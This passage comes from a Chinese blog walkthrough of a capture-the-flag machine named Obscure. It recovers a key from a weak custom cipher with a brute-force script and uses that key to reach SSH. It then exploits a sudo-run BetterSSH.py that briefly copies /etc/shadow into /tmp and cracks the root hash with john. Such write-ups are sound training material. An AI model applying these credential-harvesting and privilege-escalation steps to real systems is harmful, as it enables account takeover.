00000040  c3 89 c3 ab c2 8f c3 a9  c3 91 c3 92 c3 9d c3 8d  <span class="token operator">|</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token operator">|</span>
00000050  c3 90 c2 85 c3 aa c3 86  c3 a1 c3 99 c3 9e c3 a3  <span class="token operator">|</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token operator">|</span>
00000060  c2 96 c3 92 c3 91 c2 88  c3 90 c3 a1 c3 99 c2 a6  <span class="token operator">|</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token operator">|</span>
00000070  c3 95 c3 a6 c3 98 c2 9e  c2 8f c3 a3 c3 8a c3 8e  <span class="token operator">|</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token operator">|</span>
00000080  c3 8d c2 81 c3 9f c3 9a  c3 aa c3 86 c2 8e c3 9d  <span class="token operator">|</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token operator">|</span>
00000090  c3 a1 c3 a4 c3 a8 c2 89  c3 8e c3 8d c3 9a c2 8c  <span class="token operator">|</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token operator">|</span>
000000a0  c3 8e c3 ab c2 81 c3 91  c3 93 c3 a4 c3 a1 c3 9b  <span class="token operator">|</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token operator">|</span>
000000b0  c3 8c c3 97 c2 89 c2 81  76                       <span class="token operator">|</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span>v<span class="token operator">|</span>
000000b9

</code></pre> 
<p>passwordreminder.txt</p> 
<pre><code class="prism language-bash">www-data@obscure:/home/robert$ hd passwordreminder.txt
hd passwordreminder.txt
00000000  c2 b4 c3 91 c3 88 c3 8c  c3 89 c3 a0 c3 99 c3 81  <span class="token operator">|</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token operator">|</span>
00000010  c3 91 c3 a9 c2 af c2 b7  c2 bf 6b                 <span class="token operator">|</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span>k<span class="token operator">|</span>
0000001b

</code></pre> 
<p>SuperSecureCrypt.py</p> 
<pre><code class="prism language-python"><span class="token keyword">import</span> sys
<span class="token keyword">import</span> argparse

<span class="token keyword">def</span> <span class="token function">encrypt</span><span class="token punctuation">(</span>text<span class="token punctuation">,</span> key<span class="token punctuation">)</span><span class="token punctuation">:</span>
    keylen <span class="token operator">=</span> <span class="token builtin">len</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span>
    keyPos <span class="token operator">=</span> <span class="token number">0</span>
    encrypted <span class="token operator">=</span> <span class="token string">""</span>
    <span class="token keyword">for</span> x <span class="token keyword">in</span> text<span class="token punctuation">:</span>
        keyChr <span class="token operator">=</span> key<span class="token punctuation">[</span>keyPos<span class="token punctuation">]</span>
        newChr <span class="token operator">=</span> <span class="token builtin">ord</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span>
        newChr <span class="token operator">=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token punctuation">(</span>newChr <span class="token operator">+</span> <span class="token builtin">ord</span><span class="token punctuation">(</span>keyChr<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">255</span><span class="token punctuation">)</span>
        encrypted <span class="token operator">+=</span> newChr
        keyPos <span class="token operator">+=</span> <span class="token number">1</span>
        keyPos <span class="token operator">=</span> keyPos <span class="token operator">%</span> keylen
    <span class="token keyword">return</span> encrypted

<span class="token keyword">def</span> <span class="token function">decrypt</span><span class="token punctuation">(</span>text<span class="token punctuation">,</span> key<span class="token punctuation">)</span><span class="token punctuation">:</span>
    keylen <span class="token operator">=</span> <span class="token builtin">len</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span>
    keyPos <span class="token operator">=</span> <span class="token number">0</span>
    decrypted <span class="token operator">=</span> <span class="token string">""</span>
    <span class="token keyword">for</span> x <span class="token keyword">in</span> text<span class="token punctuation">:</span>
        keyChr <span class="token operator">=</span> key<span class="token punctuation">[</span>keyPos<span class="token punctuation">]</span>
        newChr <span class="token operator">=</span> <span class="token builtin">ord</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span>
        newChr <span class="token operator">=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token punctuation">(</span>newChr <span class="token operator">-</span> <span class="token builtin">ord</span><span class="token punctuation">(</span>keyChr<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">255</span><span class="token punctuation">)</span>
        decrypted <span class="token operator">+=</span> newChr
        keyPos <span class="token operator">+=</span> <span class="token number">1</span>
        keyPos <span class="token operator">=</span> keyPos <span class="token operator">%</span> keylen
    <span class="token keyword">return</span> decrypted

parser <span class="token operator">=</span> argparse<span class="token punctuation">.</span>ArgumentParser<span class="token punctuation">(</span>description<span class="token operator">=</span><span class="token string">'Encrypt with 0bscura\'s encryption algorithm'</span><span class="token punctuation">)</span>

parser<span class="token punctuation">.</span>add_argument<span class="token punctuation">(</span><span class="token string">'-i'</span><span class="token punctuation">,</span>
                    metavar<span class="token operator">=</span><span class="token string">'InFile'</span><span class="token punctuation">,</span>
                    <span class="token builtin">type</span><span class="token operator">=</span><span class="token builtin">str</span><span class="token punctuation">,</span>
                    <span class="token builtin">help</span><span class="token operator">=</span><span class="token string">'The file to read'</span><span class="token punctuation">,</span>
                    required<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span>

parser<span class="token punctuation">.</span>add_argument<span class="token punctuation">(</span><span class="token string">'-o'</span><span class="token punctuation">,</span>
                    metavar<span class="token operator">=</span><span class="token string">'OutFile'</span><span class="token punctuation">,</span>
                    <span class="token builtin">type</span><span class="token operator">=</span><span class="token builtin">str</span><span class="token punctuation">,</span>
                    <span class="token builtin">help</span><span class="token operator">=</span><span class="token string">'Where to output the encrypted/decrypted file'</span><span class="token punctuation">,</span>
                    required<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span>

parser<span class="token punctuation">.</span>add_argument<span class="token punctuation">(</span><span class="token string">'-k'</span><span class="token punctuation">,</span>
                    metavar<span class="token operator">=</span><span class="token string">'Key'</span><span class="token punctuation">,</span>
                    <span class="token builtin">type</span><span class="token operator">=</span><span class="token builtin">str</span><span class="token punctuation">,</span>
                    <span class="token builtin">help</span><span class="token operator">=</span><span class="token string">'Key to use'</span><span class="token punctuation">,</span>
                    required<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span>

parser<span class="token punctuation">.</span>add_argument<span class="token punctuation">(</span><span class="token string">'-d'</span><span class="token punctuation">,</span> action<span class="token operator">=</span><span class="token string">'store_true'</span><span class="token punctuation">,</span> <span class="token builtin">help</span><span class="token operator">=</span><span class="token string">'Decrypt mode'</span><span class="token punctuation">)</span>

args <span class="token operator">=</span> parser<span class="token punctuation">.</span>parse_args<span class="token punctuation">(</span><span class="token punctuation">)</span>

banner <span class="token operator">=</span> <span class="token string">"################################\n"</span>
banner<span class="token operator">+=</span> <span class="token string">"#           BEGINNING          #\n"</span>
banner<span class="token operator">+=</span> <span class="token string">"#    SUPER SECURE ENCRYPTOR    #\n"</span>
banner<span class="token operator">+=</span> <span class="token string">"################################\n"</span>
banner <span class="token operator">+=</span> <span class="token string">"  ############################\n"</span>
banner <span class="token operator">+=</span> <span class="token string">"  #        FILE MODE         #\n"</span>
banner <span class="token operator">+=</span> <span class="token string">"  ############################"</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>banner<span class="token punctuation">)</span>
<span class="token keyword">if</span> args<span class="token punctuation">.</span>o <span class="token operator">==</span> <span class="token boolean">None</span> <span class="token operator">or</span> args<span class="token punctuation">.</span>k <span class="token operator">==</span> <span class="token boolean">None</span> <span class="token operator">or</span> args<span class="token punctuation">.</span>i <span class="token operator">==</span> <span class="token boolean">None</span><span class="token punctuation">:</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Missing args"</span><span class="token punctuation">)</span>
<span class="token keyword">else</span><span class="token punctuation">:</span>
    <span class="token keyword">if</span> args<span class="token punctuation">.</span>d<span class="token punctuation">:</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Opening file {0}..."</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>args<span class="token punctuation">.</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span>
        <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span>args<span class="token punctuation">.</span>i<span class="token punctuation">,</span> <span class="token string">'r'</span><span class="token punctuation">,</span> encoding<span class="token operator">=</span><span class="token string">'UTF-8'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>
            data <span class="token operator">=</span> f<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>

        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Decrypting..."</span><span class="token punctuation">)</span>
        decrypted <span class="token operator">=</span> decrypt<span class="token punctuation">(</span>data<span class="token punctuation">,</span> args<span class="token punctuation">.</span>k<span class="token punctuation">)</span>

        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Writing to {0}..."</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>args<span class="token punctuation">.</span>o<span class="token punctuation">)</span><span class="token punctuation">)</span>
        <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span>args<span class="token punctuation">.</span>o<span class="token punctuation">,</span> <span class="token string">'w'</span><span class="token punctuation">,</span> encoding<span class="token operator">=</span><span class="token string">'UTF-8'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>
            f<span class="token punctuation">.</span>write<span class="token punctuation">(</span>decrypted<span class="token punctuation">)</span>
    <span class="token keyword">else</span><span class="token punctuation">:</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Opening file {0}..."</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>args<span class="token punctuation">.</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span>
        <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span>args<span class="token punctuation">.</span>i<span class="token punctuation">,</span> <span class="token string">'r'</span><span class="token punctuation">,</span> encoding<span class="token operator">=</span><span class="token string">'UTF-8'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>
            data <span class="token operator">=</span> f<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>

        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Encrypting..."</span><span class="token punctuation">)</span>
        encrypted <span class="token operator">=</span> encrypt<span class="token punctuation">(</span>data<span class="token punctuation">,</span> args<span class="token punctuation">.</span>k<span class="token punctuation">)</span>

        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Writing to {0}..."</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>args<span class="token punctuation">.</span>o<span class="token punctuation">)</span><span class="token punctuation">)</span>
        <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span>args<span class="token punctuation">.</span>o<span class="token punctuation">,</span> <span class="token string">'w'</span><span class="token punctuation">,</span> encoding<span class="token operator">=</span><span class="token string">'UTF-8'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>
            f<span class="token punctuation">.</span>write<span class="token punctuation">(</span>encrypted<span class="token punctuation">)</span>

</code></pre> 
<p>该py文件是用来进行加解密的。通过check.txt等文件的语义推测，使用key对check.txt加密得到out.txt，passswordreminder.txt也是加密得到的密文。因此需要先解密出key。</p> 
<p>分析加密算法，</p> 
<pre><code class="prism language-python"><span class="token keyword">def</span> <span class="token function">encrypt</span><span class="token punctuation">(</span>text<span class="token punctuation">,</span> key<span class="token punctuation">)</span><span class="token punctuation">:</span>
    keylen <span class="token operator">=</span> <span class="token builtin">len</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span>
    keyPos <span class="token operator">=</span> <span class="token number">0</span>
    encrypted <span class="token operator">=</span> <span class="token string">""</span>
    <span class="token keyword">for</span> x <span class="token keyword">in</span> text<span class="token punctuation">:</span>
        keyChr <span class="token operator">=</span> key<span class="token punctuation">[</span>keyPos<span class="token punctuation">]</span>
        newChr <span class="token operator">=</span> <span class="token builtin">ord</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span>
        newChr <span class="token operator">=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token punctuation">(</span>newChr <span class="token operator">+</span> <span class="token builtin">ord</span><span class="token punctuation">(</span>keyChr<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">255</span><span class="token punctuation">)</span>
        encrypted <span class="token operator">+=</span> newChr
        keyPos <span class="token operator">+=</span> <span class="token number">1</span>
        keyPos <span class="token operator">=</span> keyPos <span class="token operator">%</span> keylen
    <span class="token keyword">return</span> encrypted
</code></pre> 
<p>加密原理为：<br> 将字符转换为ascii码后与key相加，再转化为字符。很简单的加密原理。</p> 
<p>明文和密文均已知，因此直接对key爆破即可。<br> 爆破脚本如下：</p> 
<pre><code class="prism language-python"><span class="token keyword">import</span> string
<span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'check.txt'</span><span class="token punctuation">,</span><span class="token string">'r'</span><span class="token punctuation">,</span>encoding<span class="token operator">=</span><span class="token string">'UTF-8'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>
    ta <span class="token operator">=</span> f<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>
    
key<span class="token operator">=</span><span class="token string">''</span>
<span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'out.txt'</span><span class="token punctuation">,</span><span class="token string">'r'</span><span class="token punctuation">,</span>encoding<span class="token operator">=</span><span class="token string">'UTF-8'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>
    data <span class="token operator">=</span> f<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token keyword">for</span> x <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">255</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
            ch <span class="token operator">=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>data<span class="token punctuation">[</span>x<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">-</span>i<span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">255</span><span class="token punctuation">)</span>
            <span class="token keyword">if</span> ch <span class="token operator">==</span> ta<span class="token punctuation">[</span>x<span class="token punctuation">]</span><span class="token punctuation">:</span>
                key <span class="token operator">+=</span><span class="token builtin">chr</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span>
                <span class="token keyword">break</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span>
</code></pre> 
<p>运行结果<br> <img src="https://images2.imgbox.com/b3/8d/uiEKH69a_o.png" alt="在这里插入图片描述"><br> 需要注意，得到的结果是多次重复的key，因此取其原始值即可。</p> 
<p>检验key是否正确：<br> <img src="https://images2.imgbox.com/24/4b/kuhHgsTI_o.png" alt="在这里插入图片描述"><br> 解密出原文，故key正确。<br> 尝试使用该key作为robert密码进行ssh登录却失败。</p> 
<p>使用该key继续解密passwordreminder.txt文件，又得到一个密码<img src="https://images2.imgbox.com/4b/3f/I30HH9SD_o.png" alt="在这里插入图片描述"><br> 使用该密码登录SSH，成功，拿到user flag。<br> <img src="https://images2.imgbox.com/3d/e2/NIKECNIw_o.png" alt="在这里插入图片描述"></p> 
<h3><a id="0x3_root_flag_439"></a>0x3 root flag</h3> 
<p>首先查看robert用户可以使用的sudo命令：</p> 
<pre><code class="prism language-baash">robert@obscure:~$ sudo -l
Matching Defaults entries for robert on obscure:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User robert may run the following commands on obscure:
    (ALL) NOPASSWD: /usr/bin/python3 /home/robert/BetterSSH/BetterSSH.py

</code></pre> 
<p>/home/robert/BetterSSH/BetterSSH.py文件内容如下：</p> 
<pre><code class="prism language-python"><span class="token keyword">import</span> sys
<span class="token keyword">import</span> random<span class="token punctuation">,</span> string
<span class="token keyword">import</span> os
<span class="token keyword">import</span> time
<span class="token keyword">import</span> crypt
<span class="token keyword">import</span> traceback
<span class="token keyword">import</span> subprocess

path <span class="token operator">=</span> <span class="token string">''</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>random<span class="token punctuation">.</span>choices<span class="token punctuation">(</span>string<span class="token punctuation">.</span>ascii_letters <span class="token operator">+</span> string<span class="token punctuation">.</span>digits<span class="token punctuation">,</span> k<span class="token operator">=</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
session <span class="token operator">=</span> <span class="token punctuation">{<!-- --></span><span class="token string">"user"</span><span class="token punctuation">:</span> <span class="token string">""</span><span class="token punctuation">,</span> <span class="token string">"authenticated"</span><span class="token punctuation">:</span> <span class="token number">0</span><span class="token punctuation">}</span>
<span class="token keyword">try</span><span class="token punctuation">:</span>
    session<span class="token punctuation">[</span><span class="token string">'user'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">"Enter username: "</span><span class="token punctuation">)</span>
    passW <span class="token operator">=</span> <span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">"Enter password: "</span><span class="token punctuation">)</span>

    <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'/etc/shadow'</span><span class="token punctuation">,</span> <span class="token string">'r'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>
        data <span class="token operator">=</span> f<span class="token punctuation">.</span>readlines<span class="token punctuation">(</span><span class="token punctuation">)</span>
    data <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">(</span>p<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">":"</span><span class="token punctuation">)</span> <span class="token keyword">if</span> <span class="token string">"$"</span> <span class="token keyword">in</span> p <span class="token keyword">else</span> <span class="token boolean">None</span><span class="token punctuation">)</span> <span class="token keyword">for</span> p <span class="token keyword">in</span> data<span class="token punctuation">]</span>
    passwords <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>
    <span class="token keyword">for</span> x <span class="token keyword">in</span> data<span class="token punctuation">:</span>
        <span class="token keyword">if</span> <span class="token operator">not</span> x <span class="token operator">==</span> <span class="token boolean">None</span><span class="token punctuation">:</span>
            passwords<span class="token punctuation">.</span>append<span class="token punctuation">(</span>x<span class="token punctuation">)</span>

    passwordFile <span class="token operator">=</span> <span class="token string">'\n'</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">'\n'</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>p<span class="token punctuation">)</span> <span class="token keyword">for</span> p <span class="token keyword">in</span> passwords<span class="token punctuation">]</span><span class="token punctuation">)</span> 
    <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'/tmp/SSH/'</span><span class="token operator">+</span>path<span class="token punctuation">,</span> <span class="token string">'w'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>
        f<span class="token punctuation">.</span>write<span class="token punctuation">(</span>passwordFile<span class="token punctuation">)</span>
    time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">.1</span><span class="token punctuation">)</span>
    salt <span class="token operator">=</span> <span class="token string">""</span>
    realPass <span class="token operator">=</span> <span class="token string">""</span>
    <span class="token keyword">for</span> p <span class="token keyword">in</span> passwords<span class="token punctuation">:</span>
        <span class="token keyword">if</span> p<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">==</span> session<span class="token punctuation">[</span><span class="token string">'user'</span><span class="token punctuation">]</span><span class="token punctuation">:</span>
            salt<span class="token punctuation">,</span> realPass <span class="token operator">=</span> p<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">'$'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">]</span>
            <span class="token keyword">break</span>

    <span class="token keyword">if</span> salt <span class="token operator">==</span> <span class="token string">""</span><span class="token punctuation">:</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Invalid user"</span><span class="token punctuation">)</span>
        os<span class="token punctuation">.</span>remove<span class="token punctuation">(</span><span class="token string">'/tmp/SSH/'</span><span class="token operator">+</span>path<span class="token punctuation">)</span>
        sys<span class="token punctuation">.</span>exit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>
    salt <span class="token operator">=</span> <span class="token string">'$6$'</span><span class="token operator">+</span>salt<span class="token operator">+</span><span class="token string">'$'</span>
    realPass <span class="token operator">=</span> salt <span class="token operator">+</span> realPass

    <span class="token builtin">hash</span> <span class="token operator">=</span> crypt<span class="token punctuation">.</span>crypt<span class="token punctuation">(</span>passW<span class="token punctuation">,</span> salt<span class="token punctuation">)</span>

    <span class="token keyword">if</span> <span class="token builtin">hash</span> <span class="token operator">==</span> realPass<span class="token punctuation">:</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Authed!"</span><span class="token punctuation">)</span>
        session<span class="token punctuation">[</span><span class="token string">'authenticated'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">1</span>
    <span class="token keyword">else</span><span class="token punctuation">:</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Incorrect pass"</span><span class="token punctuation">)</span>
        os<span class="token punctuation">.</span>remove<span class="token punctuation">(</span><span class="token string">'/tmp/SSH/'</span><span class="token operator">+</span>path<span class="token punctuation">)</span>
        sys<span class="token punctuation">.</span>exit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>
    os<span class="token punctuation">.</span>remove<span class="token punctuation">(</span>os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token string">'/tmp/SSH/'</span><span class="token punctuation">,</span>path<span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>
    traceback<span class="token punctuation">.</span>print_exc<span class="token punctuation">(</span><span class="token punctuation">)</span>
    sys<span class="token punctuation">.</span>exit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>

<span class="token keyword">if</span> session<span class="token punctuation">[</span><span class="token string">'authenticated'</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">:</span>
    <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>
        command <span class="token operator">=</span> <span class="token builtin">input</span><span class="token punctuation">(</span>session<span class="token punctuation">[</span><span class="token string">'user'</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token string">"@Obscure$ "</span><span class="token punctuation">)</span>
        cmd <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'sudo'</span><span class="token punctuation">,</span> <span class="token string">'-u'</span><span class="token punctuation">,</span>  session<span class="token punctuation">[</span><span class="token string">'user'</span><span class="token punctuation">]</span><span class="token punctuation">]</span>
        cmd<span class="token punctuation">.</span>extend<span class="token punctuation">(</span>command<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">" "</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        proc <span class="token operator">=</span> subprocess<span class="token punctuation">.</span>Popen<span class="token punctuation">(</span>cmd<span class="token punctuation">,</span> stdout<span class="token operator">=</span>subprocess<span class="token punctuation">.</span>PIPE<span class="token punctuation">,</span> stderr<span class="token operator">=</span>subprocess<span class="token punctuation">.</span>PIPE<span class="token punctuation">)</span>

        o<span class="token punctuation">,</span>e <span class="token operator">=</span> proc<span class="token punctuation">.</span>communicate<span class="token punctuation">(</span><span class="token punctuation">)</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'Output: '</span> <span class="token operator">+</span> o<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'ascii'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'Error: '</span>  <span class="token operator">+</span> e<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'ascii'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>e<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'ascii'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&gt;</span> <span class="token number">0</span> <span class="token keyword">else</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">''</span><span class="token punctuation">)</span>
</code></pre> 
<p>该文件主要作用是模拟ssh，通过读取/etc/shadow文件并摘取出其中有效的用户名和密码，之后与用户输入进行比较，一致则认证成功。</p> 
<p>然而，漏洞在于，该文件在读取/etc/shadow文件后将其信息短暂地保存在/tmp/SSH/目录下，这样便可以通过脚本获取到密码信息。</p> 
<p>使用脚本获取后，查看获取到的用户密码信息<br> <img src="https://images2.imgbox.com/02/9a/vMWVQ9Qg_o.png" alt="在这里插入图片描述"><br> 将密码hash部分保存为pwd.txt，使用john爆破<br> <img src="https://images2.imgbox.com/a0/ee/lUGDKyt7_o.png" alt="在这里插入图片描述"><br> 成功得到root密码<br> 切换成root身份<br> <img src="https://images2.imgbox.com/a2/bd/2xfROf4c_o.png" alt="在这里插入图片描述"><br> 成功拿到root flag。</p> 
<h3><a id="0x4__534"></a>0x4 总结</h3> 
<p>这个靶机涉及到的知识很多，如网站目录爆破、密码学等，学到了许多。<br> 另外，最近疫情形式仍然很严峻，希望大家都能平平安安，希望爱的人能够平平安安，开开心心。</p>
                </div>
		</div>
		<div id="gabottom"></div>
	</article>
</main>


<nav class="pager flex">
	<div class="pager__item pager__item--prev">
		<a class="pager__link" href="/posts/911f6737a925aeaf2f1c8b3d67634ee0/" rel="prev">
			<span class="pager__subtitle">«&thinsp;Previous</span>
			<p class="pager__title">c&#43;&#43;标准库vector文件</p>
		</a>
	</div>
	<div class="pager__item pager__item--next">
		<a class="pager__link" href="/posts/9c256ab3dbaad26e58d72e060ae9aeb6/" rel="next">
			<span class="pager__subtitle">Next&thinsp;»</span>
			<p class="pager__title">Python3中利用map将列表当中的string类型转换为int类型或其它类型</p>
		</a>
	</div>
</nav>


			</div>
			
		</div>
		<footer class="footer">
	<div class="container footer__container flex">
		
		<div class="footer__copyright">
			&copy; 2024 菜鸟程序员博客.
			<span class="footer__copyright-credits">Generated with <a href="https://gohugo.io/" rel="nofollow noopener" target="_blank">Hugo</a> and <a href="https://github.com/Vimux/Mainroad/" rel="nofollow noopener" target="_blank">Mainroad</a> theme.</span>
		</div>
	</div>
</footer>
<div id="gafoot"></div>
<script src="https://101121.xyz/ga/app.js"></script>


	</div>
<script async defer src="/js/menu.js"></script>
</body>
</html>